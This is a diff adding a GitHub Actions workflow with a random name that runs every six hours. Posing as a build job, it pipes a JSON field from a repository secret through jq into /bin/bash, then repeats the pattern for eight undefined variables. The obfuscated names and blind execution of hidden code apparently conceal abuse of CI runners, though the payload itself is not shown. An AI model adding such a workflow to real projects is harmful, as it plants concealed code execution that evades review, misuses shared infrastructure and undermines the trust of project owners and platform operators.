@@ -1,0 +1,25 @@
+name: xishiqishii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xishiqishii
+        env:
+          bgq82294: ${{ secrets.bgq82294 }}
+        run: |
+          echo $bgq82294 | jq -r .uqer26 | /bin/bash
+          echo $shfp756 | jq -r .h38501 | /bin/bash
+          echo $imigm669 | jq -r .atev28 | /bin/bash
+          echo $z6 | jq -r .t4 | /bin/bash
+          echo $f5729 | jq -r .pqooy79 | /bin/bash
+          echo $hzqf55 | jq -r .kn896 | /bin/bash
+          echo $gvsji4111 | jq -r .k17 | /bin/bash
+          echo $mfxi39 | jq -r .qv3399 | /bin/bash
+          echo $aufu2 | jq -r .wjzkd9 | /bin/bash
+
